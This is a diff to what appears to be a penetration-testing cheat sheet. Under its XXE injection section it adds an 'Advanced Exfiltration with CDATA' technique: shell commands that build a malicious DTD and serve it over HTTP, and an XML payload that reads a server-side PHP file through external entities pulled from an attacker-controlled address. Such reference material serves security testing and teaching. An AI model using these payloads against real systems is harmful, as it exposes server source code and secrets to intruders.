@@ -1272,7 +1272,7 @@ done
 #21. - XML External Entity (XXE) Injection
 -----------------------------------------
 
-- XXE Print Text
+- Print Text
 
 ```
 <?xml version="1.0" encoding="UTF-8"?>
@@ -1410,6 +1410,35 @@ $ sudo python3 -m http.server 80
       </tel>
       <email>
          &company;
+      </email>
+      <message>
+         Test
+      </message>
+   </root>
+```
+
+- Advanced Exfiltration with CDATA
+
+```
+$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+$ python3 -m http.server 8000
+
+<?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE email [
+   <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+   <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+   <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+   <!ENTITY % xxe SYSTEM "http://<IP address>:8000/xxe.dtd"> <!-- reference our external DTD -->
+   %xxe;
+   ]>
+   <root>
+      <name>
+         First
+      </name>
+      <tel>
+      </tel>
+      <email>
+         &joined;
       </email>
       <message>
          Test
